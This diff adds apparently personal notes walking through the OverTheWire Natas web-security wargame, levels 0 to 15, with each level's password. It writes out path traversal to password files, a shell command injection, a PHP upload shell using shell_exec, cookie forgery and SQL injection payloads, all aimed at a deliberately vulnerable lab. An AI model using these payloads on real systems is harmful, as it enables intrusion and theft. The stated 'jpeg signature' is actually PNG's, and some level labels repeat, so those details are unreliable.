@@ -1,0 +1,186 @@
+natas0 -> natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+password can be found by inspecting the page
+
+natas1 -> natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+password can be found by inspecting using the ispect hotkey.
+
+natas2 -> natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+password can be found in the users file. /files at the end of url
+
+natas3 -> natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+a que in the comments saying google wont find it. /robots.txt at end of url
+
+which is the web crawler file to list websites. we find the /s3cr3t
+directory which has the password.
+
+
+
+natas4 -> natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+curl 'http://natas4.natas.labs.overthewire.org' -H 'Referer: http://natas5.natas.labs.overthewire.org/' -u natas4
+
+<-H> to specify a header. <Refere> is where the request is comming from.
+<-u> to supply credentials to the webserver.
+
+natas5 -> natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+using any cookie manager add on int he browser change the value of logged in to 1
+
+natas5 -> natas6: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+secret code: FOEIUWGHFEEUHOFUOIU
+
+the source code shows an included directory that can be browsed into.
+view the source code of the directory page to obtain the secret code
+
+natas6 -> natas7: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
+
+hint is in the source code for the path.
+ if you input any page, the error message shows the includes path.
+
+
+natas7 -> natas8: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+view sourcecode.
+ecoding logic for $secret is shown. Reverse it!.
+use w3c php engine
+
+cp encodedsecret for sourcecode
+echo hex2bin("3d3d516343746d4d6d6c315669563362"); -> ==QcCtmMml1ViV3b 
+reverseit: echo strrev("==QcCtmMml1ViV3b"); ->  b3ViV1lmMmtCcQ==
+
+in terminal: echo "b3ViV1lmMmtCcQ==" | base64 -d 
+
+$secret = "oubWYf2kBq"
+
+
+natas8 -> natas9: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+based on th4e same path used in natas7.
+
+t;cat ../../../../etc/natas_webpass/natas10
+
+this will input 't' to $key and ';' ends the command. 
+
+we traverse outside the the current page directory and read the password file
+
+natas9 -> natas10: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+
+u /etc/natas_webpass/natas11
+
+<u> is a letter to look for in the files.
+< /etc/natas_webpass/natas11 > is another file to look into.
+
+natas10 -> natas11: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+The idea is to reverse engineer the logic int he source code.
+The source code is refactor to our needs. Blogs were a huge part of this.
+
+<refactor.php> does the following
+
+1. Set the $dataToFindkey is the encoded data that we derive the key from.
+2. The resulting key is a string of 'qw8J'
+3. We use 'qw8J' as the key to encode the data that we want 'showpassword = yes'
+4. Following the same logic in the challeneg source code we get the encrypted cookie
+5. set the encrypted cookie in the browser eithr by using a cookie editor
+or the storage>cookies in inspectElement in the browser.
+6.Refresh page
+
+<?php
+
+//this is the given cookie. The "=" is encoded to something else.
+
+$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
+
+// $dataToFindTheKey = json_encode (array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
+$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    //$key = json_encode (array("showpassword"=>"no", "bgcolor"=>"#ffffff"));  
+    $key ="qw8J";
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character  
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+ // echo xor_encrypt(base64_decode($cookie));  
+
+echo base64_encode(xor_encrypt(json_encode($data)));
+
+
+?>
+
+
+
+natas11 -> natas12: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+Help: https://www.jonyschats.nl/writeups/overthewire/natas/natas12/
+
+TIP: try the code and see what hapeens before understanding the logic.
+You can try the PHP code at: http://www.writephponline.com/
+
+upload a php file containing the following:
+<?php $output = shell_exec('cat /etc/natas_webpass/natas13'); echo $output; ?>
+which reads the password file.
+
+Then when uploaded the file extension changes from .php to .jpg
+The source code shows that a hidden field is concatenating the .jpeg extension to the randomly generated filename
+
+1.upload .php file containing the exec code
+2.inspect page and change the already geenrated fielname to .php
+3.click upload
+4. click on the .php file to get the password.
+
+
+
+natas12 -> natas13: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+the exif_imagetype() function in php checks the file signature for image files.
+the rest of the source code logic is the same as the previous level.
+
+1. create a txt file with the follwoing code:
+
+<?php $output = shell_exec('cat /etc/natas_webpass/natas14'); echo $output; ?>
+
+2. lookup the jpeg file signature (which is 89 50 4E 47 0D 0A 1A 0A)
+3. open the text file with any hex editor (I used HxD) and paste the jpeg signature into the txt file.
+4. browse for the file and before uploading it, change the extension to .php
+5. upload and click on the file to get the password.
+
+another method: https://www.jonyschats.nl/writeups/overthewire/natas/natas13/
+
+
+
+natas13 -> natas14: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+SQL injection; inline comments in php are either "// or #"; we use #
+
+1. username input = " or 1=1; #
+
+The 1 qoutation mark closes the username field and the password field is ignored by the #
+1=1 is a true statement so the qurey evaluates to true.
+
+natas14 -> natas15: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+SQL injection; bruteforce password using the like binary for case sensitive results.
+
+use % at the end of the like binary matching string to look for results that STARTS WITH the chars.
+
+ex:http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20password%20like%20binary%20%22W%
+
+To brute force the password check alphanum.sh in the repo.
+
+There is a python version at https://www.jonyschats.nl/writeups/overthewire/natas/natas15/
